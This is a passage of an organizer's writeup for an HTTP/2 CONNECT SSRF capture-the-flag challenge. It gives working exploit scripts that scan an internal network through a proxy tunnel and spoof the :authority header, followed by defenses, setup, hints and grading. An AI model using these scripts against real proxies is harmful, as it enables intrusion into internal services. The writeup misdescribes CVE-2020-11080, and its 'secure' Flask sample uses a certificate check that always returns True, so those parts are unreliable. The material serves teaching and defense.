        flag_end = response_body.find(b'}', flag_start) + 1
        flag = response_body[flag_start:flag_end].decode('utf-8')

        print(f"FLAG: {flag}")
        print("="*60)
        return flag
    else:
        print(f"[-] Exploit failed. Status: {status_code}")
        print(f"[-] Response body:\n{response_body.decode('utf-8', errors='ignore')}")
        sys.exit(1)


if __name__ == '__main__':
    try:
        exploit()
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)
    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
```

**Usage**:

```bash
pip install h2
python exploit.py
```

**Expected Output**:

```
[*] HTTP/2 CONNECT Challenge - Exploit
[*] Target: localhost:10000

[+] Connecting to proxy...
[+] Establishing CONNECT tunnel to 172.20.0.10:8080...
[+] Tunnel established
[+] Sending GET /admin with :authority = internal.acme.corp...
[+] Reading response...

============================================================
SUCCESS!
============================================================
FLAG: WSL{http2_authority_header_confusion}
============================================================
```

### 5.2 Complete Automated Exploit (Full Solution)

This version includes network scanning and automated discovery:

```python
#!/usr/bin/env python3
"""
Complete automated exploit for HTTP/2 CONNECT Challenge
Includes network scanning, service enumeration, and flag extraction
"""

from h2.connection import H2Connection
from h2.config import H2Configuration
from h2.events import ResponseReceived, DataReceived, StreamEnded
import socket
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


class HTTP2ConnectExploit:
    """Automated exploit for HTTP/2 CONNECT SSRF challenge"""

    def __init__(self, proxy_host='localhost', proxy_port=10000):
        self.proxy_host = proxy_host
        self.proxy_port = proxy_port

    def scan_port(self, target_ip, target_port, timeout=2):
        """Scan single port via CONNECT tunnel"""
        try:
            sock = socket.create_connection((self.proxy_host, self.proxy_port), timeout=timeout)
            sock.settimeout(timeout)

            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # SETTINGS
            data = sock.recv(65535)
            conn.receive_data(data)
            sock.sendall(conn.data_to_send())

            # CONNECT
            stream_id = conn.get_next_available_stream_id()
            headers = [(':method', 'CONNECT'), (':authority', f'{target_ip}:{target_port}')]
            conn.send_headers(stream_id, headers, end_stream=False)
            sock.sendall(conn.data_to_send())

            # Read response
            start = time.time()
            status = None

            while time.time() - start < timeout:
                try:
                    data = sock.recv(65535)
                    if not data:
                        break
                    events = conn.receive_data(data)
                    for event in events:
                        if isinstance(event, ResponseReceived):
                            for name, value in event.headers:
                                if name == b':status':
                                    status = value.decode()
                    sock.sendall(conn.data_to_send())
                    if status:
                        break
                except socket.timeout:
                    break

            sock.close()
            return status == '200'

        except Exception:
            return False

    def scan_network(self, network_prefix='172.20.0', ports=None):
        """Scan network range for open ports"""
        if ports is None:
            ports = [80, 8080, 8000, 3000, 5000]

        print(f"[*] Scanning {network_prefix}.0/24...")
        open_ports = []

        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for i in range(1, 255):
                ip = f"{network_prefix}.{i}"
                for port in ports:
                    futures.append(executor.submit(self.scan_port, ip, port))

            for future in as_completed(futures):
                pass  # Suppress progress output

        # Re-scan discovered hosts for confirmation
        for i in range(1, 255):
            ip = f"{network_prefix}.{i}"
            for port in ports:
                if self.scan_port(ip, port, timeout=1):
                    open_ports.append((ip, port))
                    print(f"[+] Found: {ip}:{port}")

        return open_ports

    def http_request(self, target_ip, target_port, method, path, authority=None):
        """Send HTTP request through CONNECT tunnel"""
        try:
            sock = socket.create_connection((self.proxy_host, self.proxy_port), timeout=10)
            config = H2Configuration(client_side=True)
            conn = H2Connection(config=config)
            conn.initiate_connection()
            sock.sendall(conn.data_to_send())

            # SETTINGS
            data = sock.recv(65535)
            conn.receive_data(data)
            sock.sendall(conn.data_to_send())

            # CONNECT
            connect_stream_id = conn.get_next_available_stream_id()
            connect_headers = [
                (':method', 'CONNECT'),
                (':authority', f'{target_ip}:{target_port}'),
            ]
            conn.send_headers(connect_stream_id, connect_headers, end_stream=False)
            sock.sendall(conn.data_to_send())

            # Wait for CONNECT response
            data = sock.recv(65535)
            conn.receive_data(data)
            sock.sendall(conn.data_to_send())

            # HTTP request
            request_stream_id = conn.get_next_available_stream_id()
            if authority is None:
                authority = f'{target_ip}:{target_port}'

            request_headers = [
                (':method', method),
                (':scheme', 'http'),
                (':authority', authority),
                (':path', path),
            ]
            conn.send_headers(request_stream_id, request_headers, end_stream=True)
            sock.sendall(conn.data_to_send())

            # Read response
            status_code = None
            response_body = b''
            stream_ended = False

            while not stream_ended:
                data = sock.recv(65535)
                if not data:
                    break

                events = conn.receive_data(data)
                for event in events:
                    if isinstance(event, ResponseReceived) and event.stream_id == request_stream_id:
                        for name, value in event.headers:
                            if name == b':status':
                                status_code = value.decode()

                    elif isinstance(event, DataReceived) and event.stream_id == request_stream_id:
                        response_body += event.data
                        conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)

                    elif isinstance(event, StreamEnded) and event.stream_id == request_stream_id:
                        stream_ended = True

                sock.sendall(conn.data_to_send())

            sock.close()
            return status_code, response_body

        except Exception as e:
            return None, None

    def enumerate_endpoints(self, target_ip, target_port):
        """Enumerate common endpoints"""
        print(f"\n[*] Enumerating {target_ip}:{target_port}...")

        paths = ['/', '/admin', '/api', '/health', '/status', '/api/status']
        endpoints = []

        for path in paths:
            status, body = self.http_request(target_ip, target_port, 'GET', path)
            if status and status != '404':
                endpoints.append((path, status))
                print(f"    {path} -> {status}")

        return endpoints

    def exploit_admin(self, target_ip, target_port):
        """Attempt to access /admin with various :authority values"""
        print(f"\n[*] Attempting to access /admin on {target_ip}:{target_port}...")

        # Test :authority values
        test_authorities = [
            f'{target_ip}:{target_port}',
            'backend.acme.corp',
            'admin.acme.corp',
            'internal.acme.corp',
        ]

        for authority in test_authorities:
            print(f"    Trying :authority = {authority}...")
            status, body = self.http_request(target_ip, target_port, 'GET', '/admin', authority=authority)

            if status == '200' and b'FLAG' in body:
                print(f"    SUCCESS!")
                return body

        return None

    def run(self):
        """Execute full automated exploit"""
        print("="*60)
        print("HTTP/2 CONNECT Challenge - Automated Exploit")
        print("="*60)
        print()

        # Step 1: Scan network
        print("[*] Step 1: Network Scanning")
        open_ports = self.scan_network()

        if not open_ports:
            print("[-] No open ports found")
            return False

        print()

        # Step 2: Enumerate services
        print("[*] Step 2: Service Enumeration")
        for ip, port in open_ports:
            endpoints = self.enumerate_endpoints(ip, port)

            # Check if /admin exists
            if any(path == '/admin' for path, _ in endpoints):
                print(f"\n[+] Found /admin on {ip}:{port}")

                # Step 3: Exploit /admin
                print(f"\n[*] Step 3: Exploiting {ip}:{port}/admin")
                result = self.exploit_admin(ip, port)

                if result:
                    # Extract flag
                    flag_start = result.find(b'WSL{')
                    flag_end = result.find(b'}', flag_start) + 1
                    if flag_start != -1 and flag_end != -1:
                        flag = result[flag_start:flag_end].decode('utf-8')

                        print()
                        print("="*60)
                        print("FLAG CAPTURED!")
                        print("="*60)
                        print(f"FLAG: {flag}")
                        print("="*60)
                        return True

        print("\n[-] Exploit failed")
        return False


if __name__ == '__main__':
    try:
        exploit = HTTP2ConnectExploit()
        success = exploit.run()
        sys.exit(0 if success else 1)

    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
        sys.exit(1)

    except Exception as e:
        print(f"[-] Error: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)
```

**Usage**:

```bash
pip install h2
python complete_exploit.py
```

**Expected Output**:

```
============================================================
HTTP/2 CONNECT Challenge - Automated Exploit
============================================================

[*] Step 1: Network Scanning
[*] Scanning 172.20.0.0/24...
[+] Found: 172.20.0.10:8080
[+] Found: 172.20.0.20:3000

[*] Step 2: Service Enumeration

[*] Enumerating 172.20.0.10:8080...
    / -> 200
    /admin -> 403
    /health -> 200
    /api/status -> 200

[+] Found /admin on 172.20.0.10:8080

[*] Step 3: Exploiting 172.20.0.10:8080/admin
[*] Attempting to access /admin on 172.20.0.10:8080...
    Trying :authority = 172.20.0.10:8080...
    Trying :authority = backend.acme.corp...
    Trying :authority = admin.acme.corp...
    Trying :authority = internal.acme.corp...
    SUCCESS!

============================================================
FLAG CAPTURED!
============================================================
FLAG: WSL{http2_authority_header_confusion}
============================================================
```

---

## 6. Defense Recommendations

### 6.1 Envoy Proxy Hardening

**Critical**: Implement RBAC to block CONNECT to internal IP ranges

```yaml
# Secure envoy.yaml configuration

http_filters:
# Add RBAC filter BEFORE dynamic_forward_proxy
- name: envoy.filters.http.rbac
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.rbac.v3.RBAC
    rules:
      action: DENY
      policies:
        "deny-internal-connect":
          permissions:
          - and_rules:
              rules:
              - header:
                  name: ":method"
                  string_match:
                    exact: "CONNECT"
              - or_rules:
                  rules:
                  # Block RFC1918 private ranges
                  - destination_ip:
                      address_prefix: "10.0.0.0"
                      prefix_len: 8
                  - destination_ip:
                      address_prefix: "172.16.0.0"
                      prefix_len: 12
                  - destination_ip:
                      address_prefix: "192.168.0.0"
                      prefix_len: 16
                  # Block localhost
                  - destination_ip:
                      address_prefix: "127.0.0.0"
                      prefix_len: 8
                  # Block link-local
                  - destination_ip:
                      address_prefix: "169.254.0.0"
                      prefix_len: 16
          principals:
          - any: true

- name: envoy.filters.http.dynamic_forward_proxy
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.dynamic_forward_proxy.v3.FilterConfig
    dns_cache_config:
      name: dynamic_forward_proxy_cache_config
      dns_lookup_family: V4_ONLY

- name: envoy.filters.http.router
  typed_config:
    "@type": type.googleapis.com/envoy.extensions.filters.http.router.v3.Router
```

**Additional Recommendations**:

1. **Disable CONNECT if not needed**:
   ```yaml
   http2_protocol_options:
     allow_connect: false  # Disable entirely
   ```

2. **Use allowlist instead of blocklist**:
   - Only permit CONNECT to specific external hosts
   - Maintain list of approved destinations

3. **Implement authentication**:
   - Require client certificates for CONNECT
   - Use OAuth/JWT for authorization

4. **Add audit logging**:
   - Log all CONNECT attempts
   - Alert on suspicious patterns (internal IP access)

### 6.2 Backend Application Hardening

**Critical**: Never trust Host/:authority headers for access control

**Secure Flask Implementation**:

```python
@app.route('/admin')
def admin():
    # Method 1: IP-based restriction (works behind reverse proxy)
    # Requires Envoy to set X-Forwarded-For header
    client_ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()

    # Validate source IP is from internal network
    if not client_ip.startswith('172.20.0.'):
        abort(403, "Access denied: Must access from internal network")

    # Method 2: Mutual TLS (best practice)
    client_cert = request.environ.get('SSL_CLIENT_CERT')
    if not client_cert:
        abort(403, "Access denied: Client certificate required")

    # Verify certificate
    if not verify_client_certificate(client_cert):
        abort(403, "Access denied: Invalid client certificate")

    # Method 3: API key authentication
    api_key = request.headers.get('X-API-Key')
    if not api_key or not verify_api_key(api_key):
        abort(403, "Access denied: Invalid API key")

    # Only after authentication/authorization
    return f"<h1>Admin Panel</h1><p>FLAG: {FLAG}</p>"


def verify_client_certificate(cert):
    """Verify client certificate against trusted CA"""
    # Implementation depends on your PKI setup
    return True  # Placeholder


def verify_api_key(key):
    """Verify API key against stored secrets"""
    import hmac
    return hmac.compare_digest(key, os.environ.get('INTERNAL_API_KEY', ''))
```

**Additional Recommendations**:

1. **Never rely solely on Host header**:
   - Host header is user-controlled in both HTTP/1.1 and HTTP/2
   - Always use additional authentication

2. **Implement proper authentication**:
   - Mutual TLS (mTLS) for service-to-service
   - OAuth 2.0 / JWT for user authentication
   - API keys for programmatic access

3. **Validate source IP** (defense in depth):
   - Check `X-Forwarded-For` header (if behind proxy)
   - Verify request originates from trusted networks
   - Use middleware to enforce IP allowlists

4. **Use security headers**:
   ```python
   @app.after_request
   def add_security_headers(response):
       response.headers['X-Content-Type-Options'] = 'nosniff'
       response.headers['X-Frame-Options'] = 'DENY'
       response.headers['Strict-Transport-Security'] = 'max-age=31536000'
       return response
   ```

### 6.3 Network Segmentation

**Principle**: Defense in depth - multiple layers of security

1. **Firewall Rules**:
   - Proxy should not have direct access to internal networks
   - Use DMZ architecture
   - Implement egress filtering

2. **Docker Network Configuration**:
   ```yaml
   # Secure network setup
   networks:
     dmz:
       driver: bridge
       ipam:
         config:
           - subnet: 10.0.1.0/24
     internal:
       driver: bridge
       internal: true  # No external access
       ipam:
         config:
           - subnet: 172.20.0.0/24

   services:
     proxy:
       networks:
         - dmz  # Only external network

     backend:
       networks:
         - internal  # Only internal network
   ```

3. **Service Mesh** (production):
   - Use Istio, Linkerd, or Consul
   - Enforce mTLS between all services
   - Implement fine-grained authorization policies

### 6.4 Monitoring and Detection

**Implement detection for exploitation attempts**:

1. **Log Analysis**:
   - Monitor for CONNECT requests to internal IP ranges
   - Alert on unusual :authority header values
   - Track failed authentication attempts

2. **Prometheus Metrics** (example):
   ```python
   from prometheus_client import Counter

   connect_attempts = Counter(
       'http2_connect_attempts_total',
       'Total CONNECT attempts',
       ['destination_ip', 'status']
   )

   @app.before_request
   def track_connect():
       if request.method == 'CONNECT':
           dest = request.headers.get(':authority', 'unknown')
           connect_attempts.labels(destination_ip=dest, status='attempted').inc()
   ```

3. **Alerting Rules**:
   - Alert when CONNECT to 10.x.x.x, 172.16-31.x.x, 192.168.x.x detected
   - Alert on rapid port scanning behavior
   - Alert on /admin access from unexpected sources

---

## 7. Environment Setup Guide

### 7.1 Quick Start (Docker Compose)

**Prerequisites**:
- Docker Engine 20.10+
- Docker Compose 2.0+
- 512MB free RAM

**Setup Steps**:

```bash
# 1. Clone/download challenge files
cd Playing-with-HTTP-2-CONNECT/

# 2. Build and start services
docker-compose up -d

# 3. Verify services are running
docker-compose ps

# Expected output:
# NAME                    IMAGE                              STATUS
# backend.acme.corp       playing-with-http-2-connect-backend    Up
# envoy.proxy             envoyproxy/envoy:v1.28-latest          Up
# internal.service        playing-with-http-2-connect-internal   Up

# 4. Test connectivity
curl http://localhost:10000/

# 5. Check logs (optional)
docker-compose logs -f proxy
```

**Environment Variables**:

Create `.env` file (or use `.env.example`):

```bash
cp .env.example .env
# Edit .env to customize FLAG if needed
```

**Stopping the Challenge**:

```bash
# Stop services
docker-compose down

# Stop and remove volumes
docker-compose down -v

# Rebuild after code changes
docker-compose up -d --build
```

### 7.2 Manual Setup (Without Docker)

**For environments without Docker:**

**Backend Service**:

```bash
cd backend/
python3 -m venv venv
source venv/bin/activate  # Windows: venv\Scripts\activate
pip install -r requirements.txt
export FLAG='WSL{http2_authority_header_confusion}'
python app.py
# Runs on http://0.0.0.0:8080
```

**Internal Service**:

```bash
cd internal-service/
python3 server.py
# Runs on http://0.0.0.0:3000
```

**Envoy Proxy**:

```bash
# Download Envoy binary
# macOS
brew install envoy

# Linux
wget https://github.com/envoyproxy/envoy/releases/download/v1.28.0/envoy-1.28.0-linux-x86_64
chmod +x envoy-1.28.0-linux-x86_64
sudo mv envoy-1.28.0-linux-x86_64 /usr/local/bin/envoy

# Run Envoy
cd envoy/
envoy -c envoy.yaml
# Runs on http://0.0.0.0:10000
```

**Note**: Manual setup requires adjusting `envoy.yaml` to use `localhost` instead of `backend.acme.corp`.

### 7.3 Troubleshooting

**Issue**: Cannot connect to http://localhost:10000

**Solutions**:
1. Check if Docker containers are running:
   ```bash
   docker-compose ps
   ```

2. Check if port 10000 is already in use:
   ```bash
   # Linux/macOS
   lsof -i :10000

   # Windows
   netstat -ano | findstr :10000
   ```

3. Check Docker logs:
   ```bash
   docker-compose logs proxy
   docker-compose logs backend
   ```

**Issue**: CONNECT tunnel fails with 503

**Possible Causes**:
- Backend service not reachable from proxy
- Incorrect IP address
- Network configuration issue

**Solutions**:
1. Verify backend is running:
   ```bash
   docker exec envoy.proxy ping -c 3 backend.acme.corp
   ```

2. Check network configuration:
   ```bash
   docker network inspect playing-with-http-2-connect_internal
   ```

3. Verify IP addresses:
   ```bash
   docker inspect backend.acme.corp | grep IPAddress
   ```

**Issue**: Flag not appearing even with correct :authority

**Solutions**:
1. Verify FLAG environment variable:
   ```bash
   docker exec backend.acme.corp env | grep FLAG
   ```

2. Check backend logs:
   ```bash
   docker-compose logs backend
   ```

3. Test backend directly from proxy container:
   ```bash
   docker exec envoy.proxy curl -H "Host: internal.acme.corp" http://172.20.0.10:8080/admin
   ```

---

## 8. Expected Solve Time & Difficulty

### 8.1 Time Estimates by Skill Level

| Skill Level | Estimated Time | Breakdown |
|-------------|----------------|-----------|
| Expert (CTF veteran, HTTP/2 experience) | 1-2 hours | Quick recon (20 min), fast scanning (30 min), immediate exploit (10 min) |
| Advanced (Security professional, some HTTP/2 knowledge) | 2-3 hours | Recon + research (45 min), scanning (45 min), trial/error on authority (45 min) |
| Intermediate (Developer, basic security knowledge) | 3-4 hours | Learning HTTP/2 (60 min), tooling setup (45 min), exploitation (90 min) |
| Beginner (Student, limited experience) | 4+ hours | Requires significant research, potential need for hints |

### 8.2 Difficulty Factors

**What makes this challenge HARD**:

1. **No hints provided**:
   - Participants must discover HTTP/2 independently
   - No indication of internal network ranges
   - No skeleton code or tooling

2. **Requires protocol knowledge**:
   - Understanding HTTP/2 pseudo-headers
   - Familiarity with CONNECT method
   - Ability to use h2 library or write raw HTTP/2

3. **Multi-step exploitation**:
   - Cannot directly access flag
   - Requires network scanning step
   - Must understand header confusion vulnerability

4. **Limited feedback**:
   - Black-box challenge
   - No source code provided to participants
   - Must infer behavior from responses

**What makes this challenge FAIR**:

1. **Standard tools work**:
   - curl can detect HTTP/2 support
   - h2 library is well-documented
   - No obscure dependencies

2. **Logical progression**:
   - Each step provides clues for next step
   - 403 error message hints at Host header check
   - Network scanning is standard CTF technique

3. **No guessing required**:
   - Flag format is known (WSL{...})
   - Internal network range is typical Docker range
   - :authority values are logical (internal.acme.corp)

### 8.3 Skill Requirements

**Required Skills**:

- [ ] Python programming (intermediate)
- [ ] HTTP protocol fundamentals
- [ ] Basic networking concepts (IP addressing, ports)
- [ ] Ability to read documentation (h2 library)
- [ ] Problem-solving and persistence

**Nice to Have**:

- [ ] HTTP/2 protocol knowledge
- [ ] Docker familiarity
- [ ] Previous CTF experience
- [ ] SSRF exploitation experience

**Not Required**:

- ❌ Advanced Envoy configuration knowledge
- ❌ Cryptography
- ❌ Binary exploitation
- ❌ Advanced reverse engineering

### 8.4 Hints for Organizers

If participants are stuck, provide hints in this order:

**Hint 1** (if stuck >1 hour):
> "The proxy server supports modern HTTP protocols. Have you checked which version?"

**Hint 2** (if stuck >2 hours):
> "HTTP/2 introduced a new method specifically for tunneling. It rhymes with 'prospect'."

**Hint 3** (if stuck >3 hours):
> "Internal Docker networks typically use the 172.16-31.x.x IP range. Common web ports include 8080."

**Hint 4** (if stuck >4 hours):
> "The backend service checks the Host header. In HTTP/2, this is derived from the :authority pseudo-header, which you control."

**Hint 5** (nuclear option):
> "Use :authority value 'internal.acme.corp' when accessing /admin through the CONNECT tunnel."

---

## 9. Educational Value

### 9.1 Learning Outcomes

Participants who complete this challenge will understand:

1. **HTTP/2 Protocol Mechanics**:
   - How HTTP/2 differs from HTTP/1.1
   - Role of pseudo-headers (`:method`, `:scheme`, `:authority`, `:path`)
   - CONNECT method for tunneling
   - Binary framing layer

2. **SSRF Attack Vectors**:
   - Traditional SSRF (URL parameter manipulation)
   - HTTP/2 CONNECT-based SSRF
   - Internal network reconnaissance techniques
   - Bypassing network-based access controls

3. **Header Confusion Vulnerabilities**:
   - Trust boundary violations
   - Protocol translation issues (HTTP/2 → HTTP/1.1)
   - Authority header spoofing
   - Importance of validating ALL request attributes

4. **Proxy Security**:
   - Risks of forward proxy misconfiguration
   - RBAC policies for CONNECT method
   - Defense in depth principles
   - Importance of IP-based filtering

5. **Practical Skills**:
   - Using Python h2 library for HTTP/2
   - Writing custom port scanners
   - Automating multi-step exploits
   - Docker networking concepts

### 9.2 Real-World Relevance

This challenge mirrors real vulnerabilities:

**CVE Examples**:

1. **CVE-2021-21295** (Netty HTTP/2 Request Smuggling):
   - Similar header confusion between HTTP/2 and HTTP/1.1
   - Allowed bypass of security controls

2. **CVE-2020-11080** (nghttp2 CONNECT Bypass):
   - Improper validation of CONNECT targets
   - Enabled SSRF to internal services

3. **AWS Metadata SSRF** (Ongoing):
   - Accessing http://169.254.169.254/latest/meta-data/
   - Common target for SSRF exploits in cloud environments

**Production Scenarios**:

1. **Corporate Forward Proxies**:
   - Organizations deploy Envoy/Nginx for outbound HTTP/2
   - Often lack proper RBAC for internal IP ranges
   - Can lead to unauthorized access to internal APIs

2. **Microservices Architectures**:
   - Services trust Host header for routing
   - No authentication between internal services
   - HTTP/2 :authority spoofing enables lateral movement

3. **CDN/Proxy Misconfigurations**:
   - Public-facing proxies with CONNECT enabled
   - No IP filtering on tunnel destinations
   - Attackers pivot to internal networks

### 9.3 CTF Integration

**Recommended Use Cases**:

1. **University Cybersecurity Courses**:
   - Teaching module: HTTP/2 security
   - Lab exercise for web application security course
   - Capstone project for advanced students

2. **Corporate Security Training**:
   - Training developers on secure proxy configuration
   - Red team exercises
   - Secure code review practice

3. **CTF Competitions**:
   - Jeopardy-style CTF (web exploitation category)
   - Hard difficulty challenge (200-300 points)
   - Pair with other web challenges for variety

4. **Bug Bounty Practice**:
   - Realistic scenario for bug bounty hunters
   - Practice identifying SSRF vulnerabilities
   - Understanding proxy security

**Complementary Challenges** (suggested):

- **Easy**: Classic SSRF via URL parameter
- **Medium**: HTTP request smuggling (CL.TE/TE.CL)
- **Hard**: This challenge (HTTP/2 CONNECT SSRF)
- **Expert**: HTTP/2 request smuggling + CONNECT tunneling

---

## 10. Appendices

### 10.1 Network Topology Diagram

```
┌─────────────────────────────────────────────────────────────┐
│                        Host Machine                          │
│                     (Participant's laptop)                   │
│                                                              │
│  ┌──────────────────────────────────────────────────────┐   │
│  │                   Docker Host                         │   │
│  │                                                       │   │
│  │  External Network (10.0.1.0/24)                      │   │
│  │  ┌────────────────────────────────────────────┐      │   │
│  │  │   Envoy Proxy (10.0.1.10)                  │      │   │
│  │  │   - Port 10000 (HTTP/2)                    │◄─────┼───┼─── localhost:10000
│  │  │   - Vulnerable CONNECT config              │      │   │
│  │  └─────────────┬──────────────────────────────┘      │   │
│  │                │                                      │   │
│  │                │ Bridge to Internal Network          │   │
│  │                ▼                                      │   │
│  │  Internal Network (172.20.0.0/24)                    │   │
│  │  ┌──────────────────────────┐   ┌─────────────────┐ │   │
│  │  │ Backend Service          │   │ Internal Service│ │   │
│  │  │ (172.20.0.10:8080)      │   │ (172.20.0.20)   │ │   │
│  │  │ - Flask app              │   │ - Dummy server  │ │   │
│  │  │ - /admin (FLAG location) │   │ - Port 3000     │ │   │
│  │  │ - Vulnerable Host check  │   │                 │ │   │
│  │  └──────────────────────────┘   └─────────────────┘ │   │
│  │                                                       │   │
│  └──────────────────────────────────────────────────────┘   │
│                                                              │
└─────────────────────────────────────────────────────────────┘

Attack Flow:
1. Participant → localhost:10000 (Envoy)
2. HTTP/2 CONNECT 172.20.0.10:8080
3. Tunnel established
4. GET /admin (:authority = internal.acme.corp)
5. Envoy → Backend (Host: internal.acme.corp)
6. Backend returns flag
```

### 10.2 HTTP/2 Frame Trace

Example of successful exploit at frame level:

```
Client → Proxy (localhost:10000)

# Connection Preface
PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n

# SETTINGS frame
SETTINGS
  HEADER_TABLE_SIZE: 4096
  ENABLE_PUSH: 1
  MAX_CONCURRENT_STREAMS: 100
  INITIAL_WINDOW_SIZE: 65535

Proxy → Client

# SETTINGS frame (server)
SETTINGS
  MAX_CONCURRENT_STREAMS: 100
  INITIAL_WINDOW_SIZE: 65536

# SETTINGS ACK
SETTINGS (ACK)

Client → Proxy

# SETTINGS ACK
SETTINGS (ACK)

# Stream 1: CONNECT request
HEADERS (END_HEADERS)
  :method: CONNECT
  :authority: 172.20.0.10:8080

Proxy → Client

# Stream 1: 200 response (tunnel established)
HEADERS (END_HEADERS)
  :status: 200

Client → Proxy

# Stream 3: HTTP request through tunnel
HEADERS (END_STREAM, END_HEADERS)
  :method: GET
  :scheme: http
  :authority: internal.acme.corp  ← SPOOFED!
  :path: /admin

Proxy → Backend (protocol translation to HTTP/1.1)

GET /admin HTTP/1.1
Host: internal.acme.corp  ← Derived from :authority
Connection: close

Backend → Proxy

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 234

<html>
...
<p><strong>FLAG:</strong> WSL{http2_authority_header_confusion}</p>
...
</html>

Proxy → Client (translation to HTTP/2)

# Stream 3: Response
HEADERS (END_HEADERS)
  :status: 200
  content-type: text/html
  content-length: 234

DATA (END_STREAM)
  <html>...</html>
```

### 10.3 Alternative Solutions

**Solution 1: Using curl + socat** (if curl supports HTTP/2 CONNECT)

```bash
# Establish CONNECT tunnel
curl -v --http2 \
  --request CONNECT \
  --proxy http://localhost:10000 \
  http://172.20.0.10:8080

# Send request through tunnel (theoretical, curl doesn't support this directly)
```

**Note**: Standard curl cannot send custom :authority after CONNECT. Custom tools required.

**Solution 2: Using nghttp (HTTP/2 client)**

```bash
# nghttp is a command-line HTTP/2 client

# Test CONNECT support
nghttp -v -H ':method: CONNECT' -H ':authority: 172.20.0.10:8080' http://localhost:10000

# Unfortunately, nghttp doesn't support sending requests through CONNECT tunnel
# Still requires custom script
```

**Solution 3: Using Burp Suite with HTTP/2 Extension**

1. Configure Burp to use HTTP/2
2. Intercept request to http://localhost:10000
3. Modify to CONNECT method
4. Send to Repeater
5. Manually craft follow-up request with spoofed :authority

**Note**: Most practical solution remains Python with h2 library.

### 10.4 Debugging Tips

**Enable verbose logging in Envoy**:

```bash
docker-compose exec proxy kill -USR1 1  # Increase log level
docker-compose logs -f proxy
```

**Inspect HTTP/2 frames with Wireshark**:

```bash
# Capture on loopback interface
sudo tcpdump -i lo -w capture.pcap port 10000

# Open in Wireshark
wireshark capture.pcap

# Filter: http2
# Analyze frames in detail
```

**Test backend independently**:

```bash
# Access backend directly (from proxy container)
docker exec envoy.proxy curl -H "Host: internal.acme.corp" http://172.20.0.10:8080/admin

# Expected: Flag appears
```

**Verify network connectivity**:

```bash
# From proxy to backend
docker exec envoy.proxy ping backend.acme.corp

# Check DNS resolution
docker exec envoy.proxy nslookup backend.acme.corp
```

### 10.5 Grading Rubric (for Educational Use)

| Criteria | Points | Description |
|----------|--------|-------------|
| HTTP/2 Detection | 10 | Identified that proxy supports HTTP/2 |
| CONNECT Discovery | 15 | Discovered CONNECT method is enabled |
| Internal Network Scan | 25 | Successfully scanned and found backend service |
| Service Enumeration | 20 | Discovered /admin endpoint |
| Vulnerability Understanding | 15 | Understood :authority header confusion |
| Flag Extraction | 15 | Successfully extracted flag |
| **BONUS**: Automated Exploit | +10 | Created automated script |
| **BONUS**: Writeup | +10 | Documented methodology |
| **Total** | 100 (+20 bonus) | |

**Scoring Guidelines**:
- **90-100+**: Excellent (complete solution, clean exploit)
- **70-89**: Good (manual exploitation, some automation)
- **50-69**: Satisfactory (solved with hints, manual steps)
- **<50**: Needs improvement (did not complete)

### 10.6 Additional Resources

**HTTP/2 Protocol**:
- RFC 7540: https://tools.ietf.org/html/rfc7540
- HTTP/2 Explained: https://daniel.haxx.se/http2/

**Python h2 Library**:
- Documentation: https://python-hyper.org/projects/h2/
- GitHub: https://github.com/python-hyper/h2
- Examples: https://github.com/python-hyper/h2/tree/master/examples

**Envoy Proxy**:
- Documentation: https://www.envoyproxy.io/docs
- RBAC Filter: https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/http/rbac/v3/rbac.proto
- CONNECT Support: https://www.envoyproxy.io/docs/envoy/latest/intro/arch_overview/http/upgrades

**SSRF Resources**:
- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- PortSwigger SSRF: https://portswigger.net/web-security/ssrf

**Related CVEs**:
- CVE-2021-21295 (Netty): https://nvd.nist.gov/vuln/detail/CVE-2021-21295
- CVE-2020-11080 (nghttp2): https://nvd.nist.gov/vuln/detail/CVE-2020-11080

---

## Conclusion

This challenge provides a realistic scenario for learning HTTP/2 security, SSRF exploitation, and header confusion vulnerabilities. The hard mode (no hints) makes it suitable for advanced CTF participants, while the comprehensive writeup enables it to be used for educational purposes.

**Key Takeaways**:
1. HTTP/2 CONNECT can be a powerful SSRF vector when misconfigured
2. Never trust the :authority (Host) header for access control
3. Defense in depth: use RBAC, authentication, IP validation, and network segmentation
4. Proxy configurations require security review, not just functional testing

**For Organizers**:
- Estimated setup time: 15 minutes (docker-compose up)
- Estimated solve time: 2-4 hours (depending on skill level)
- Recommended points: 250-300 (hard difficulty)
- Suitable for: Advanced web exploitation category

---

**End of Writeup**

*Version 1.0 - March 2026*
*Prepared by: Challenge Author*
*For: Admin/Organizer Use Only*
*Do NOT distribute to participants before/during challenge*
